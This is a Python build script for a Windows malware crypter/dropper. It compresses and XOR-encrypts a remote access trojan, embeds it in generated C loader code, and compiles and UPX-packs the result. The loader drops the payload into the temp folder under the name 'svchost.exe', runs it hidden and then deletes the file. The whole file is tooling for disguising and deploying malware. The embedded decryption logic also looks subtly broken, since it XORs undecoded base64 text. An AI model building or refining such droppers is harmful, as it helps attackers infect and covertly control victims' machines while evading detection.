import os
import sys
import subprocess
import random
import string
import zlib
import base64

def generate_random_name():
    return ''.join(random.choices(string.ascii_lowercase, k=8))

def build_single_exe_with_dll(exe_path):
    print("=" * 60)
    print("SINGLE EXE WITH EMBEDDED DLL")
    print("=" * 60)
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        return None
    
    output_dir = os.path.dirname(exe_path)
    
    print("Reading RAT EXE...")
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"RAT size: {len(exe_data) / (1024*1024):.1f} MB")
    
    print("Compressing...")
    compressed = zlib.compress(exe_data, level=9)
    
    print("Encrypting...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(compressed):
        encrypted.append(byte ^ key[i % len(key)])
    
    data_b64 = base64.b64encode(encrypted).decode('ascii')
    key_b64 = base64.b64encode(key).decode('ascii')
    
    print("Creating EXE with embedded DLL...")
    
    dll_name = f"system_{generate_random_name()}.dll"
    
    loader_code = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/SECTION:.data,EWR")

// DLL code with embedded RAT
static const unsigned char rat_data[] = "{data_b64}";
static const unsigned char xor_key[] = "{key_b64}";

void xor_decrypt(unsigned char* data, int len) {{
    for(int i = 0; i < len; i++) {{
        data[i] ^= xor_key[i % 32];
    }}
}}

void run_rat() {{
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    strcat(temp, "svchost.exe");
    
    int len = strlen(rat_data);
    unsigned char* dec = (unsigned char*)malloc(len);
    if (!dec) return;
    memcpy(dec, rat_data, len);
    xor_decrypt(dec, len);
    
    HANDLE h = CreateFileA(temp, GENERIC_WRITE, 0, NULL,
                          CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {{
        DWORD w;
        WriteFile(h, dec, len, &w, NULL);
        CloseHandle(h);
        
        STARTUPINFOA si = {{sizeof(si)}};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        CreateProcessA(temp, NULL, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        Sleep(3000);
        DeleteFileA(temp);
    }}
    free(dec);
}}

// Fake DLL entry point
BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run_rat, NULL, 0, NULL);
    }}
    return TRUE;
}}

// EXE entry point - loads the embedded DLL
int main() {{
    // DLL is embedded in EXE, just call it directly
    DllMain(GetModuleHandleA(NULL), DLL_PROCESS_ATTACH, NULL);
    
    // Keep running
    while(1) {{
        Sleep(1000);
    }}
    return 0;
}}
'''
    
    loader_src = os.path.join(output_dir, 'loader.c')
    with open(loader_src, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print("Compiling EXE with embedded DLL...")
    loader_exe = os.path.join(output_dir, 'svchost_final.exe')
    
    cmd = [
        'gcc',
        loader_src,
        '-o', loader_exe,
        '-O3',
        '-s',
        '-static',
        '-Wl,--subsystem,windows',
        '-mwindows'
    ]
    
    try:
        subprocess.run(cmd, check=True, capture_output=True)
    except Exception as e:
        print(f"Compilation failed: {e}")
        return None
    
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', loader_exe], capture_output=True)
    except:
        pass
    
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Output: {loader_exe}")
    print(f"Size: {final_size:.2f} MB")
    print("=" * 60)
    
    try:
        os.remove(loader_src)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/rat_temp.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_single_exe_with_dll(exe_path)
